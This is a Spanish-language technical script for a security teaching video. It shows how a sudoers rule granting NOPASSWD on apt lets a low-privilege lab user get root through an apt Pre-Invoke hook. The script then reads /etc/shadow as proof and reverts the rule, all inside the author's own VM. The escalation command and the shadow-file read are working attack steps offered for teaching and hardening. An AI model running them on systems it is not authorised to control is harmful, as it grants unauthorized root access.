# sudo mal configurado (NOPASSWD en apt) — guion técnico

> Objetivo: enseñar por qué dar `NOPASSWD` a un usuario de bajo privilegio sobre UN SOLO binario puede
> acabar siendo acceso total a root, aunque el admin piense que está limitando el permiso a algo razonable
> y útil. No hay CVE: es una mala práctica real y muy común (GTFOBins). Todo ocurre dentro de la propia VM,
> con un usuario de laboratorio creado y borrado por el propio guion — sin objetivo remoto ni laboratorio
> de terceros.

## 1. Lo que se enseña (para el guion del vídeo)
- Un admin quiere que un usuario (`invitado`) pueda actualizar el sistema él mismo (`apt update`/`upgrade`)
  sin pedirle la contraseña de root cada vez — un caso de uso MUY real y, a primera vista, razonable. Añade
  una regla en `/etc/sudoers.d/`, editada con **nano** a través de `visudo -f` (la forma correcta de tocar
  sudoers: valida la sintaxis al guardar, nunca a mano con un editor cualquiera sobre `/etc/sudoers`
  directamente): `invitado ALL=(ALL) NOPASSWD: /usr/bin/apt`.
- Antes de la regla: `invitado` no está en absoluto en sudoers → `sudo -l` pide su contraseña y, aun
  dándola, sale "Sorry, user invitado may not run sudo on kali." (ningún permiso).
- Después de la regla: `sudo -l` ya NO pide contraseña (es lo que significa NOPASSWD) y lista exactamente
  `(ALL) NOPASSWD: /usr/bin/apt`. Y funciona para lo que el admin quería: `sudo apt update` actualiza de
  verdad el sistema, sin pedir contraseña. Hasta aquí, todo parece ir bien.
- El fallo: `apt`/`apt-get` admiten **hooks** (`APT::Update::Pre-Invoke`, `Dpkg::Pre-Invoke`...) que
  ejecutan CUALQUIER comando antes de la operación — pensados para scripts de mantenimiento, pero no
  distinguen entre "un comando de mantenimiento" y "una shell". Con el permiso que le dieron, `invitado`
  ejecuta `apt` como root vía `sudo`, y el hook `-o APT::Update::Pre-Invoke::=/bin/sh` lanza una shell con
  esos privilegios de root ANTES de que apt haga nada más. Es el mismo principio que cualquier entrada de
  GTFOBins (gtfobins.github.io): no importa qué binario sea "razonable" dar, importa si ese binario tiene
  alguna vía (hook, `-exec`, un editor interno, lo que sea) para ejecutar algo arbitrario.
- Prueba final de que es root de verdad (no solo que el hook "dice" root): leer `/etc/shadow`, fichero que
  solo root puede leer.
- Cierre: se revierte la regla (`rm /etc/sudoers.d/invitado`) y se comprueba que `sudo -l` vuelve a negarlo
  todo — la lección también enseña cómo se arregla.

## 2. La secuencia (medida en esta VM, 2026-11-20, IP puente 192.168.1.11 — ver §4)
```bash
# Fase 0 (NO grabado): crear el usuario de laboratorio con una contraseña propia del guion
sudo useradd -m -s /bin/bash invitado
echo 'invitado:invitado-demo-2026' | sudo chpasswd      # contraseña de laboratorio, NO adivinada

# Acto 1 — invitado, un usuario normal sin privilegios (terminal "Invitado")
sudo -iu invitado          # el admin (kali, con su propio sudo sin contraseña) abre la sesión de invitado
whoami                     # invitado
id                         # uid=1001(invitado) gid=1001(invitado) groups=1001(invitado)
sudo -l                    # pide contraseña -> se teclea invitado-demo-2026
                            # "Sorry, user invitado may not run sudo on kali."

# Acto 2 — el admin edita /etc/sudoers.d con nano (terminal "Admin", ya kali)
export EDITOR=nano         # kali ya tiene env_keep para EDITOR en el Default de /usr/sbin/visudo
sudo visudo -f /etc/sudoers.d/invitado
# dentro de nano: se teclea la línea
#   invitado ALL=(ALL) NOPASSWD: /usr/bin/apt
# Ctrl+O (Write Out) -> Enter (confirma el nombre) -> Ctrl+X (Exit)
sudo visudo -c              # "/etc/sudoers.d/invitado: parsed OK" (entre las demás)

# Acto 3 — invitado: el permiso existe, sin contraseña, y lo usa de verdad (terminal "Invitado")
sudo -l                     # (ALL) NOPASSWD: /usr/bin/apt  — sin pedir contraseña
sudo apt update             # funciona: "N packages can be upgraded" (uso legítimo, tal y como se pensó)

# Acto 4 — explotación con GTFOBins: el hook de apt ejecuta lo que sea, como root
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh

# Acto 5 — shell interactiva de root y prueba final (YA dentro de esa shell)
whoami                      # root (ya sin "sudo": es una shell real de root)
id                           # uid=0(root)
head -1 /etc/shadow          # root:*:20425:0:99999:7:::  (solo root puede leer este fichero)
exit                          # vuelve a la shell de invitado (apt sigue su update a medias: Ctrl+C)

# Acto 6 — cierre: se revierte la mala configuración (terminal "Admin")
sudo rm /etc/sudoers.d/invitado
# terminal "Invitado": sudo -l de nuevo -> "Sorry, user invitado may not run sudo on kali." (otra vez negado)
```
Verificación por OCR, siempre sobre texto llano que aparece de verdad en pantalla (el propio mensaje de
`sudo`, el `uid=...` de `id`, la línea de `visudo -c`, "packages can be upgraded", la primera línea de
`/etc/shadow`). Medido esta sesión: buscar la ruta completa `sudoers.d/invitado: parsed OK` con el OCR
falla por la racha de `/` y `.`; se verifica solo `"parsed ok"` (igual que `"root"` a secas para la línea
de `/etc/shadow`, que tiene una racha de `:`).

## 3. Marco ético
Usuario y regla de sudoers son de laboratorio: los crea y borra el propio guion, dentro de la VM del
usuario (`127.0.0.1`/bridge propio). La contraseña de `invitado` (`invitado-demo-2026`) la elige el guion
para esta demo — no es una contraseña real de nadie ni se intenta adivinar ninguna. `/etc/shadow` se lee
solo para probar el acceso root logrado en esta misma demo (el hash mostrado es `*`, cuenta bloqueada: no
expone ninguna contraseña real). `sudo apt update` se ejecuta de verdad (hay salida a internet en esta VM);
no instala ni modifica nada, solo refresca los índices de paquetes. Al terminar, el guion borra el usuario
`invitado` y la regla de sudoers: no queda ningún rastro permanente en la VM.

## 4. Entorno: la VM puede seguir en modo puente de una demo de red anterior
Si `vm_control.py doctor` falla con "no hay reenvío 127.0.0.1:2222 -> 22", la VM sigue con el adaptador en
modo puente (de `DEMO-MASSCAN`, por ejemplo). Usa `VM_HOST=<IP real> VM_SSH_PORT=22` (la IP la da
`vm_control.py status` sin necesitar SSH) para todos los comandos, incluido este script (medido esta
sesión con `VM_HOST=192.168.1.11`); además esta demo SÍ necesita salida a internet real (para `apt
update`), así que el modo puente de hecho ayuda aquí.

## 5. Para el vídeo (guion sugerido)
1. **Gancho:** "Dejar que un usuario actualice el sistema con sudo suena inofensivo. No lo es."
2. **El permiso que parece sensato:** el admin lo edita con nano, se ve la línea exacta que añade, y
   funciona de verdad para lo que se pensó: `sudo apt update` sin pedir contraseña.
3. **El giro:** `apt` tiene hooks (`Pre-Invoke`) pensados para scripts de mantenimiento — pero no
   distinguen un script de una shell. GTFOBins documenta decenas de binarios "razonables" con el mismo
   problema (find, vim, less, tar, awk, apt, apt-get...).
4. **La prueba que no admite duda:** leer `/etc/shadow`, el fichero que define quién es root en el sistema.
5. **Cierre:** antes de dar NOPASSWD a un binario — incluso uno tan "normal" como apt — comprueba su
   entrada en gtfobins.github.io. Y revierte el permiso en cuanto puedas, como se hace al final del vídeo.

## 6. Nada que limpiar (fuera de lo que el propio guion limpia)
El usuario `invitado` y la regla `/etc/sudoers.d/invitado` los crea y borra el propio guion (Fase 0 antes
de grabar, y al terminar). `sudo apt update` no instala ni cambia ningún paquete, solo refresca índices. No
se toca ningún otro usuario ni fichero del sistema.
